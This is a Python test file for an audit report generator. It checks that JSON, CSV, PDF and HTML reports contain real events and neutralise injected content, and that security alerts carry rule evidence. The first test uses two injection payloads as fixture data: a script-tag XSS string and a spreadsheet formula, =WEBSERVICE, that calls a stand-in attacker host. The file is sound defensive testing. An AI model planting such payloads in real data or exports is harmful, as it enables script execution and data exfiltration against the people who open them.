# Copyright (C) 2026 Andrewchay
# Use of this software is governed by the Business Source License
# included in the LICENSE file of this repository.
#
# As of the Change Date specified in that file, in accordance with
# the Business Source License, use of this software will be governed
# by the Apache License, Version 2.0.
"""W05.03 audit report content, export safety, and evidence-bearing alerts."""

from __future__ import annotations

import asyncio
import csv
import io
import json
from datetime import datetime, timedelta

from bridge.audit.logger import AuditEvent
from bridge.audit.query import (
    AuditQuery,
    AuditReportGenerator,
    ReportFormat,
    SecurityThresholds,
)


def _reporter(tmp_path, events: list[AuditEvent], **kwargs) -> AuditReportGenerator:
    path = tmp_path / "audit.jsonl"
    path.write_text("\n".join(event.to_json() for event in events) + "\n", encoding="utf-8")
    return AuditReportGenerator(AuditQuery(log_file=str(path)), **kwargs)


def test_all_report_formats_contain_real_events_and_escape_active_content(tmp_path):
    now = datetime.utcnow()
    event = AuditEvent(
        event_id="evt-danger",
        timestamp=now,
        user_id="<script>alert(1)</script>",
        action="=WEBSERVICE(\"https://attacker.invalid\")",
        status="failure",
        resource_type="dataset",
        resource_id="a&b",
    )
    reporter = _reporter(tmp_path, [event])

    async def generate():
        args = (now - timedelta(minutes=1), now + timedelta(minutes=1))
        return [
            await reporter.generate_compliance_report(*args, format=fmt)
            for fmt in ReportFormat
        ]

    json_report, csv_report, pdf_report, html_report = asyncio.run(generate())
    parsed = json.loads(json_report)
    assert parsed["summary"]["total_events"] == 1
    assert parsed["events"][0]["event_id"] == "evt-danger"

    rows = list(csv.reader(io.StringIO(csv_report)))
    assert rows[1][0] == "evt-danger"
    assert rows[1][4].startswith("'=")

    assert isinstance(pdf_report, bytes)
    assert pdf_report.startswith(b"%PDF-1.4")
    assert b"evt-danger" in pdf_report
    assert b"WEBSERVICE" in pdf_report

    assert "<script>" not in html_report
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html_report
    assert "a&amp;b" in html_report


def test_threshold_alerts_include_rule_evidence_and_false_positive_scope(tmp_path):
    now = datetime.utcnow()
    events = [
        AuditEvent(
            event_id=f"login-{index}",
            timestamp=now - timedelta(minutes=index),
            user_id="alice",
            username="alice",
            action="auth:login",
            status="failure",
            client_ip="192.0.2.10",
        )
        for index in range(3)
    ]
    reporter = _reporter(
        tmp_path,
        events,
        security_thresholds=SecurityThresholds(
            failed_login_count=2, failed_action_count=2, max_anomalies=10
        ),
    )

    report = asyncio.run(reporter.generate_security_report(days=1))
    alerts = {alert["rule_id"]: alert for alert in report["alerts"]}

    assert report["thresholds"]["failed_login_count"] == 2
    assert alerts["failed-login-count"]["observed"] == 3
    assert alerts["failed-login-count"]["evidence_event_ids"] == [
        "login-0", "login-1", "login-2"
    ]
    repeated = alerts["repeated-action-failure"]
    assert repeated["action"] == "auth:login"
    assert repeated["evidence"]["events"][0]["event_id"]
    assert repeated["false_positive_notes"]
